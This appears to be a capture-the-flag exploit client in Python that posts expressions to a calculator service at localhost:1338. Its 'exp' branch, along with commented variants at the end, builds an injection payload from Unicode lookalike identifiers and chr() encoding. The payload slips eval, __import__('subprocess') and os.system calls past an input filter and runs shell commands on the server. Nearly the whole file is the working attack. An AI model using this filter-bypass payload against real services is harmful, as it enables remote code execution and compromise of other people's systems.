import requests

def main():
    url = 'http://localhost:1338/'
    while True:
        expression = input('expression? > ')
        if expression == 'exit':
            break
        if expression == 'exp':
            base = '__import__("subprocess").check_output("ls", shell=True)'
            base_chr_int = [ord(i) for i in base]
            # expression = r'𝓮𝓿𝓪𝓵(𝕔𝕙𝕣(105) + 𝕔𝕙𝕣(109) + 𝕔𝕙𝕣(112) + 𝕔𝕙𝕣(111) + 𝕔𝕙𝕣(114) + 𝕔𝕙𝕣(116) + 𝕔𝕙𝕣(32) + 𝕔𝕙𝕣(111) + 𝕔𝕙𝕣(115));𝓰𝓮𝓽𝓪𝓽𝓽𝓻(𝐨𝐬, 𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(121) + 𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(116) + 𝕔𝕙𝕣(101) + 𝕔𝕙𝕣(109))(𝕔𝕙𝕣(108) + 𝕔𝕙𝕣(115))'
            expression = f'𝓮𝓿𝓪𝓵({"+".join([f"𝕔𝕙𝕣({i})" for i in base_chr_int])})'
        data = {'expression': expression}
        r = requests.post(url + 'calc', json=data)
        print(r.json()["result"])
        
if __name__ == '__main__':
    main()


# 𝓰𝓮𝓽𝓪𝓽𝓽𝓻
# 𝐢𝐦𝐩𝐨𝐫𝐭 𝐨𝐬;𝓰𝓮𝓽𝓪𝓽𝓽𝓻(𝐨𝐬, 𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(121) + 𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(116) + 𝕔𝕙𝕣(101) + 𝕔𝕙𝕣(109))(𝕔𝕙𝕣(108) + 𝕔𝕙𝕣(115))